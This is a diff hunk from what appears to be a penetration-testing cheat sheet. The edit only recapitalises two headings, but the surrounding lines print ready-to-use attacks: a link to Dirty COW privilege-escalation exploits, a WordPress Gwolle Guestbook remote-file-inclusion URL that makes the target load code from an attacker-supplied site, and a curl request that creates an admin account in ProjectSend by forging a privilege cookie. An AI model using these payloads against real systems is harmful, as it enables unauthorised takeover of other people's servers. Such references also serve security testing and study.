@@ -445,10 +445,10 @@ If you want to exucute code with a tar command (e.g. backup cronjob) , rename fi
 #### dirty cOw privilege escalation
 https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
 
-#### word press gwolle guestbook plugin RFI xploit
+#### Wordpress gwolle guestbook plugin RFI xploit
 `http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]`
 
-#### wordpress projectsend exploit
+#### Wordpress projectsend exploit
 - add an admin user to the database:
 `curl http://projectsend.local/users-add.php -H 'Cookie: userlevel=9' -X POST --data'add_user_form_name=necci&add_user_form_email=poplix@papuasia.org&add_user_form_level=9&add_user_form_user=necci&add_user_form_active=1&add_user_form_pass=123456'`
 
